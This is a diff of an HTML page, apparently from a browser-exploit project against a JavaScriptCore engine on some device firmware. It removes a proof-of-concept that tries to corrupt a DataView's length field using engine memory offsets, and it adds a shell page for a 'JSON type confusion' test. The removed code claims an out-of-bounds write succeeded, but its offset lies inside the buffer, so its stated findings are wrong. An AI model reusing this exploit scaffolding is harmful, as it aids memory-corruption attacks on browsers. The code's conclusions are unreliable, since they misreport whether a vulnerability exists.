@@ -1,102 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Definitiva - Re-teste de Corrupção de m_length</title>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
+    <title>Teste Isolado - JSON Type Confusion</title>
     <style>
-        body { font-family: monospace; background: #111; color: #eee; }
-        pre { white-space: pre-wrap; word-wrap: break-word; border: 1px solid #555; padding: 10px; background: #222; }
-        .good { color: #73c991; }
-        .error { color: #f47174; }
-        .vuln { background-color: #f89d13; color: black; font-weight: bold; padding: 2px; }
-        .info { color: #61afef; }
+        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
+        #output-advanced { /* ID usado por logS3 */
+            background: #222;
+            border: 1px solid #444;
+            padding: 10px;
+            height: 75vh; 
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+        /* Estilos básicos de log para melhor visualização */
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
+        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; }
+        .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>Prova de Conceito Definitiva</h1>
-    <p>Re-teste da vulnerabilidade de corrupção do `m_length` do DataView, usando a lógica validada dos arquivos mais recentes.</p>
-    <hr>
-    <pre id="log"></pre>
-    
-    <script>
-        const logElement = document.getElementById('log');
-        function log(message, type = 'info') {
-            console.log(message);
-            const span = document.createElement('span');
-            span.className = type;
-            span.textContent = message + '\n';
-            logElement.appendChild(span);
-        }
+    <h1>Teste Isolado: JSON Type Confusion</h1>
+    <p>Abra o console do desenvolvedor para verificar possíveis erros que não são capturados no log da página.</p>
+    <button id="runIsolatedTestBtn">Iniciar Teste Isolado</button>
+    <div id="output-advanced"></div>
 
-        // ==============================================================================
-        // Simulação do ambiente e constantes dos seus arquivos
-        // ==============================================================================
-        
-        // De config.mjs
-        const JSC_OFFSETS = { ArrayBufferView: { M_VECTOR_OFFSET: 0x10, M_LENGTH_OFFSET: 0x18, M_MODE_OFFSET: 0x1C }};
-        const OOB_CONFIG = { ALLOCATION_SIZE: 32768 };
-
-        // De core_exploit.mjs
-        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
-        const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x58 + 0x18 = 0x70
-
-        // ==============================================================================
-        // LÓGICA DA PROVA DE CONCEITO
-        // ==============================================================================
-
-        function runFinalPoc() {
-            log('[+] Iniciando PoC Definitiva da Corrupção de m_length...');
-
-            let buffer;
-            let dv;
-
-            try {
-                // Etapa 1: Criar o ambiente exatamente como em triggerOOB_primitive
-                log('[1] Criando ArrayBuffer e DataView...');
-                buffer = new ArrayBuffer(OOB_CONFIG.ALLOCATION_SIZE);
-                dv = new DataView(buffer, 0, OOB_CONFIG.ALLOCATION_SIZE);
-                log(`   -> Buffer criado com tamanho: ${buffer.byteLength} bytes`);
-                log(`   -> DataView criado. Tamanho ANTES da corrupção: ${dv.byteLength}`);
-                log('----------------------------------------------------');
-
-                // Etapa 2: A Vulnerabilidade - Tentativa de corrupção do m_length
-                const offset = OOB_DV_M_LENGTH_OFFSET;
-                const value = 0xFFFFFFFF;
-                log(`[2] Acionando a vulnerabilidade: Escrevendo ${toHex(value)} no offset crítico 0x${offset.toString(16)}...`);
-                
-                // Esta é a operação central. Uma falha de segurança permitiria esta escrita,
-                // e uma vulnerabilidade explorável resultaria na alteração do dv.byteLength.
-                dv.setUint32(offset, value, true); // true para little-endian
-
-                log(`   -> Escrita OOB (setUint32) executada sem gerar erro. Isso confirma a existência de uma falha de verificação de limites.`, 'info');
-                log('----------------------------------------------------');
-
-                // Etapa 3: Verificação do resultado
-                log(`[3] Verificando o estado do DataView após a tentativa de corrupção...`);
-                const newLength = dv.byteLength;
-                log(`   -> Tamanho DEPOIS da corrupção: ${newLength}`);
-
-                if (newLength === 0xFFFFFFFF) {
-                    log('\n[!!!] SUCESSO! A vulnerabilidade é EXPLORÁVEL!', 'vuln');
-                    log('O tamanho do DataView foi expandido, confirmando que a primitiva OOB pode ser estabelecida.', 'good');
-                } else {
-                    log('\n[XXX] FALHA. O tamanho do DataView NÃO foi alterado.', 'error');
-                    log('Diagnóstico: Embora a escrita OOB seja permitida sem erro (confirmando um bug), ela não está modificando o metadado de tamanho. A vulnerabilidade foi mitigada neste firmware.', 'error');
-                }
-
-            } catch (e) {
-                log(`\n[XXX] ERRO CRÍTICO INESPERADO: ${e.message}`, 'error');
-                log('Isso indica que a falha foi corrigida a ponto de agora gerar um erro, como deveria.', 'error');
-            }
-        }
-
-        function toHex(val) {
-             return '0x' + (val >>> 0).toString(16);
-        }
-
-        // Executa a PoC.
-        runFinalPoc();
-
-    </script>
+    <script type="module" src="js/run_isolated_test.mjs"></script>
 </body>
 </html>
